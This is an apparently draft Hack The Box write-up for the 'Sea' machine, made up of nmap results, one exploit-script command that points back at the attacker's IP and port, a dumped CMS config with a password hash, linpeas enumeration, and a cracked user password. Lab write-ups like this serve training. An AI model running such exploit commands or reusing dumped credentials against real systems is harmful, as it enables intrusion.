---
title: HTB Sea
author: kei5uke
draft: true
description: Writeup for HTB Sea
tags:
  - linux
  - writeup
---

# Port

```
# nmap -sC -sV -T4 10.129.117.150 -oN nmap.tcp.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-09 17:34 CET
Nmap scan report for 10.129.117.150
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`python3 exploit.py --url http://sea.htb/loginURL --xip 10.10.14.242 --xport 443`

```
www-data@sea:/var/www/sea/data$ cat database.js
cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
```

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                              
══╣ Active Ports (netstat)                                                                                                                                
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                         
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:60173         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

```
╔══════════╣ Backup folders
drwxr-xr-x 2 root root 3 Apr 15  2020 /snap/core20/2318/var/backups                                                                                       
total 0

drwxr-xr-x 2 root root 4096 Feb  9 16:35 /var/backups
total 72
-rw-r--r-- 1 root root 47903 Aug  1  2024 apt.extended_states.0
-rw-r--r-- 1 root root  5146 Aug  1  2024 apt.extended_states.1.gz
-rw-r--r-- 1 root root  5329 Jul 25  2024 apt.extended_states.2.gz
-rw-r--r-- 1 root root  5344 Feb 21  2024 apt.extended_states.3.gz
```

amay’s pass: `mychemicalromance`
